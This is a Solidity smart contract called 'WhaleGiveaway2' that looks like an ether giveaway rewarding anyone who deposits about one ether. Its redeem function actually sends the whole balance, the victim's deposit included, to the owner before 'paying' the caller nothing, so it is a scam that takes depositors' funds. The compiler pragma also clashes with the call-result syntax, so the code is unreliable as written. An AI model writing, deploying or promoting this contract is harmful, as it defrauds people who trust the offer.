pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0));
        require(data.length > 0);

        bool success;
        bytes memory result;
        (success, result) = adr.call.value(msg.value)(data);
        require(success);
    }
}